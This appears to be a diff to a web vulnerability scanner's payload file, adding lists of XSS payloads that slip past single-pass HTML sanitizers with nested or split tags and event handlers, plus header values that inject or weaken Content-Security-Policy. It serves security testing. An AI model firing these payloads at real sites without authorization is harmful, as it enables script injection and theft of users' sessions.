@@ -294,3 +294,27 @@ CONTENT_TYPE = [
     "<html:script>alert('{marker}')</html:script></foo>",
     "<title><![CDATA[</title><script>alert('{marker}')</script>]]></title>",
 ]
+
+# Sanitizer bypass payloads — exploit non-recursive / single-pass HTML sanitizers
+SANITIZER_BYPASS = [
+    "<<script>Foo</script>iframe src=\"javascript:alert(`{marker}`)\">",
+    "<<script>Foo</script>img src=x onerror=alert('{marker}')>",
+    "<<script>Foo</script>svg onload=alert('{marker}')>",
+    # Double-tag nesting — inner tag exposed after outer stripped
+    "<scr<script>ipt>alert('{marker}')</scr</script>ipt>",
+    "<img <script></script>src=x onerror=alert('{marker}')>",
+    # Recursive-stripping bypass via nested identical tag
+    "<scr<scr<script>ipt>ipt>alert('{marker}')</script>",
+    "<<a|ascript>alert(`{marker}`)</script>",
+]
+
+# CSP header injection payloads — exploiting user-controlled CSP header values
+CSP_INJECTION = [
+    # Append unsafe-inline to script-src via semicolon injection
+    "x.png; script-src 'unsafe-inline' 'self'",
+    "x.png; default-src 'unsafe-inline' *",
+    "x.png; script-src *",
+    "x.png; script-src 'nonce-{marker}'",
+    # Null the CSP entirely via overlong header value  
+    "x.png\r\nContent-Security-Policy: script-src 'unsafe-inline'",
+]
